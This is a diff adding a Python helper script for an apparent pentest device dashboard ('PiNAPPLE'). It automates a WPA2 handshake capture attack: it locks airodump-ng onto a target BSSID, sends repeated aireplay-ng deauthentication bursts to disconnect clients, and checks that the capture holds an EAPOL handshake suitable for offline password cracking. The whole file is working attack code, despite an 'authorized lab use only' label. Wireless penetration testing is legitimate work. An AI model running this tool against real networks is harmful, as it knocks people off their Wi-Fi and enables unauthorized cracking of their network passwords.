@@ -1,0 +1,287 @@
+#!/usr/bin/env python3
+"""PiNAPPLE WPA2 handshake capture helper (authorized lab use only).
+
+Captures a 4-way handshake for one BSSID using airodump-ng, nudges clients
+with a short deauth burst, and only reports success when the capture really
+contains an EAPOL handshake.
+
+Usage (matches the dashboard):
+    pinapple-handshake <bssid> <channel> <out.pcap> [client]
+
+Only the Python standard library is used. airodump-ng, aireplay-ng and either
+hcxpcapngtool or aircrack-ng must be installed (the aircrack-ng and hcxtools
+packages).
+"""
+
+import argparse
+import glob
+import os
+import re
+import shutil
+import signal
+import subprocess
+import sys
+import tempfile
+import time
+
+_stop = False
+_children = []
+
+
+def note(message):
+    print(message, flush=True)
+
+
+def find_tool(name):
+    found = shutil.which(name)
+    if found:
+        return found
+    for prefix in ('/usr/sbin/', '/usr/bin/', '/sbin/', '/bin/'):
+        candidate = prefix + name
+        if os.path.exists(candidate):
+            return candidate
+    return name
+
+
+def valid_mac(value):
+    return bool(re.match(r'^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', (value or '').strip()))
+
+
+def set_channel(iw, interface, channel):
+    try:
+        r = subprocess.run([iw, 'dev', interface, 'set', 'channel', str(channel)],
+                           capture_output=True, text=True, timeout=5)
+    except OSError as exc:
+        return False, str(exc)
+    if r.returncode != 0:
+        return False, (r.stderr or r.stdout).strip() or 'iw set channel failed'
+    return True, ''
+
+
+def kill_children():
+    for proc in list(_children):
+        if proc is None or proc.poll() is not None:
+            continue
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        except OSError:
+            try:
+                proc.terminate()
+            except OSError:
+                pass
+    deadline = time.time() + 2
+    for proc in list(_children):
+        if proc is None or proc.poll() is not None:
+            continue
+        try:
+            proc.wait(timeout=max(0.1, deadline - time.time()))
+        except subprocess.TimeoutExpired:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+            except OSError:
+                try:
+                    proc.kill()
+                except OSError:
+                    pass
+
+
+def handle_signal(signum, frame):
+    global _stop
+    _stop = True
+    kill_children()
+
+
+def find_cap(prefix):
+    files = sorted(glob.glob(prefix + '-*.cap'), key=os.path.getmtime)
+    return files[-1] if files else None
+
+
+def handshake_present(cap_path, hcxpcapngtool, aircrack):
+    """Return True only when the capture contains an EAPOL handshake."""
+    if not cap_path or not os.path.exists(cap_path) or os.path.getsize(cap_path) < 24:
+        return False
+
+    if hcxpcapngtool and os.path.exists(hcxpcapngtool):
+        tmp = cap_path + '.check.hc22000'
+        try:
+            subprocess.run([hcxpcapngtool, '-o', tmp, cap_path],
+                           capture_output=True, text=True, timeout=15)
+            if os.path.exists(tmp):
+                with open(tmp, errors='ignore') as handle:
+                    for line in handle:
+                        if line.startswith('WPA*02*'):
+                            return True
+        except (OSError, subprocess.SubprocessError):
+            pass
+        finally:
+            try:
+                os.remove(tmp)
+            except OSError:
+                pass
+
+    if aircrack and os.path.exists(aircrack):
+        try:
+            r = subprocess.run([aircrack, cap_path], capture_output=True,
+                               text=True, timeout=15)
+            match = re.search(r'(\d+)\s+handshake', r.stdout + r.stderr, re.I)
+            if match and int(match.group(1)) > 0:
+                return True
+        except (OSError, subprocess.SubprocessError):
+            pass
+    return False
+
+
+def main():
+    parser = argparse.ArgumentParser(description='PiNAPPLE WPA2 handshake capture')
+    parser.add_argument('bssid')
+    parser.add_argument('channel', type=int)
+    parser.add_argument('out_path')
+    parser.add_argument('client', nargs='?', default='FF:FF:FF:FF:FF:FF')
+    parser.add_argument('interface', nargs='?', default='wlan1')
+    parser.add_argument('--timeout', type=int, default=40,
+                        help='seconds to wait for a handshake (default 40)')
+    parser.add_argument('--deauth-interval', type=float, default=4.0,
+                        help='seconds between deauth bursts (default 4)')
+    parser.add_argument('--iw', default=None)
+    parser.add_argument('--airodump', default=None)
+    parser.add_argument('--aireplay', default=None)
+    parser.add_argument('--aircrack', default=None)
+    parser.add_argument('--hcxpcapngtool', default=None)
+    args = parser.parse_args()
+
+    bssid = args.bssid.strip().upper()
+    client = (args.client or 'FF:FF:FF:FF:FF:FF').strip().upper()
+    if not valid_mac(bssid):
+        raise SystemExit('invalid BSSID: %s' % args.bssid)
+    if not valid_mac(client):
+        raise SystemExit('invalid client MAC: %s' % args.client)
+    if not 1 <= args.channel <= 14:
+        raise SystemExit('channel must be between 1 and 14')
+    if not 5 <= args.timeout <= 60:
+        raise SystemExit('timeout must be between 5 and 60 seconds')
+
+    iw = args.iw or find_tool('iw')
+    airodump = args.airodump or find_tool('airodump-ng')
+    aireplay = args.aireplay or find_tool('aireplay-ng')
+    aircrack = args.aircrack or find_tool('aircrack-ng')
+    hcx = args.hcxpcapngtool or shutil.which('hcxpcapngtool') or ''
+
+    missing = [name for name, path in (('iw', iw), ('airodump-ng', airodump),
+                                       ('aireplay-ng', aireplay))
+               if not os.path.exists(path)]
+    if missing:
+        raise SystemExit('missing required tool(s): %s' % ', '.join(missing))
+
+    out_dir = os.path.dirname(os.path.abspath(args.out_path))
+    if out_dir:
+        os.makedirs(out_dir, exist_ok=True)
+
+    ok, message = set_channel(iw, args.interface, args.channel)
+    if not ok:
+        raise SystemExit('could not set %s to channel %d: %s' %
+                         (args.interface, args.channel, message))
+
+    workdir = tempfile.mkdtemp(prefix='pinapple-handshake-')
+    prefix = os.path.join(workdir, 'cap')
+    log_path = os.path.join(workdir, 'airodump.log')
+
+    signal.signal(signal.SIGTERM, handle_signal)
+    signal.signal(signal.SIGINT, handle_signal)
+
+    note('capturing handshake: %s on %s channel %d (timeout %ds)' %
+         (bssid, args.interface, args.channel, args.timeout))
+
+    dump = None
+    try:
+        with open(log_path, 'w') as log_handle:
+            dump = subprocess.Popen(
+                [airodump, '--bssid', bssid, '--channel', str(args.channel),
+                 '--write', prefix, '--output-format', 'pcap',
+                 '--write-interval', '1', '--band', 'bg', args.interface],
+                stdout=log_handle, stderr=subprocess.STDOUT,
+                start_new_session=True)
+        _children.append(dump)
+
+        cap_path = None
+        deadline = time.time() + 8
+        while time.time() < deadline and not _stop:
+            cap_path = find_cap(prefix)
+            if cap_path:
+                break
+            if dump.poll() is not None:
+                break
+            time.sleep(0.25)
+
+        if dump.poll() is not None:
+            try:
+                with open(log_path) as handle:
+                    detail = handle.read()[-400:].strip()
+            except OSError:
+                detail = ''
+            note('airodump-ng exited early: %s' % (detail or 'unknown error'))
+            return 1
+
+        cap_path = cap_path or find_cap(prefix)
+        if not cap_path:
+            note('airodump-ng did not create a capture file')
+            return 1
+
+        note('listening for the 4-way handshake; nudging clients every %.1fs' %
+             args.deauth_interval)
+        deadline = time.time() + args.timeout
+        next_deauth = time.time()
+        found = False
+
+        while not _stop and time.time() < deadline:
+            cap_path = find_cap(prefix) or cap_path
+            if handshake_present(cap_path, hcx, aircrack):
+                found = True
+                break
+
+            if time.time() >= next_deauth:
+                cmd = [aireplay, '--deauth', '6', '-a', bssid]
+                if client != 'FF:FF:FF:FF:FF:FF':
+                    cmd += ['-c', client]
+                cmd += ['--ignore-negative-one', args.interface]
+                try:
+                    subprocess.run(cmd, capture_output=True, text=True, timeout=12)
+                except (OSError, subprocess.SubprocessError):
+                    pass
+                next_deauth = time.time() + args.deauth_interval
+                note('deauth burst sent; still waiting')
+            time.sleep(1)
+
+        # Stop airodump cleanly so the pcap is complete before checking/copying.
+        try:
+            os.killpg(os.getpgid(dump.pid), signal.SIGTERM)
+        except OSError:
+            pass
+        try:
+            dump.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            try:
+                os.killpg(os.getpgid(dump.pid), signal.SIGKILL)
+            except OSError:
+                pass
+
+        cap_path = find_cap(prefix) or cap_path
+        if not found and cap_path:
+            found = handshake_present(cap_path, hcx, aircrack)
+
+        if found and cap_path and os.path.exists(cap_path):
+            shutil.copy2(cap_path, args.out_path)
+            note('handshake captured: %s' % args.out_path)
+            return 0
+
+        note('no handshake captured within %ds' % args.timeout)
+        return 1
+    finally:
+        kill_children()
+        try:
+            shutil.rmtree(workdir, ignore_errors=True)
+        except Exception:
+            pass
+
+
+if __name__ == '__main__':
+    sys.exit(main())
